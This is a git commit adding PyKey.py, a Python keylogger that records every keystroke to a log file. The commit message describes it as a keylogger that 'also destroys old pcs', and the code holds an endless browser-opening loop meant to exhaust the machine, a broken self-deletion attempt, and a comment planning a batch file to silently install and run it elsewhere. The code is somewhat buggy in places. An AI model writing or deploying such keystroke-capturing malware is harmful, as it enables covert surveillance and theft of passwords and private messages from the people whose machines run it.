2e0c0de63c0fe15675e225a0cd82a48a5e6e4627
deadpoolstark3 <deadpoolstark3@gmail.com>
2023-03-16 13:28:40 +0530

    v1 keylogger that also destroys old pcs....

---
+++ PyKey.py
@@ -0,0 +1,70 @@
+import pynput
+from pynput.keyboard import Key,Listener
+import webbrowser
+import os, atexit
+
+
+
+with open("log.txt","a") as f:
+    f.write("\n")
+
+count = 0
+keys = []
+i=0
+
+
+
+def on_press(key):
+    global count, keys,i
+
+
+    keys.append(key)
+    count += 1
+    i+=1
+    print(format(key))
+
+    if count>=3:
+        count=0
+        write_file(keys)
+        keys = []
+
+
+    #browser repeat open
+    if i>=10000000000:
+        while True:
+            webbrowser.open("https://www.youtube.com/")
+        i=0
+
+def write_file(keys):
+    with open("log.txt","a") as f:
+        for key in keys:
+            k=str(key).replace("'", "")
+            l=len(k)
+            if k.find ("enter") > 0:
+                f.write("\n")
+            elif k.find("backspace")>0:
+                f.write("[backspace]")
+            elif k.find("space") > 0:
+                f.write(" ")
+            elif k.find ("Key") == -1:
+                f.write(k)
+            elif k.find("esc") > 0:
+                f.write("\n")
+            
+
+
+#for stopping everything.a
+def on_release(key):
+    if key == Key.esc:
+        return False
+        texit.register(lambda file = __file__: os.remove("PyKey.py"))#deleting file that didnt work? wat
+
+#calling all functions
+with Listener(on_press=on_press, on_release=on_release)as listener:
+    listener.join()
+
+#upload to git.make a batch file that installs git and pulls the code and runs it(run u need to figure out.)
+
+#ethical:add a pw for this so that it can work as a parental control thing.
+
+
